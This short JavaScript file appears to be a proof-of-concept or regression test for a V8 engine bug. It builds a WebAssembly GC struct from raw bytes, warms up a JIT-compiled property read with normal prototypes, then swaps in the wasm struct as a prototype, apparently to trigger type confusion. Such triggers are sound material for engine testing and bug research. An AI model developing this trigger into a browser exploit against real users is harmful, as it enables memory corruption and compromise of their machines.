const wasm_code = new Uint8Array([0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00, 0x01, 0x06, 0x01, 0x5f, 0x7f, 0x00, 0x03, 0x02, 0x01, 0x00, 0x07, 0x05, 0x01, 0x01, 0x66, 0x00, 0x00, 0x0a, 0x07, 0x01, 0x05, 0x00, 0x01, 0xfb, 0x0d, 0x00]);
const wasm_module = new WebAssembly.Module(wasm_code);
const wasm_instance = new WebAssembly.Instance(wasm_module, {});
const wasm_struct_proto = wasm_instance.exports.f();

const normal_proto = { p: 1 };

function victim(o) {
    return o.p;
}

let use_wasm_proto = false;
for (let i = 0; i < 25000; i++) {
    let obj = {};
    let proto_obj = use_wasm_proto ? wasm_struct_proto : normal_proto;
    Object.setPrototypeOf(obj, proto_obj);
    victim(obj);
    if (i === 24998) {
        use_wasm_proto = true;
    }
}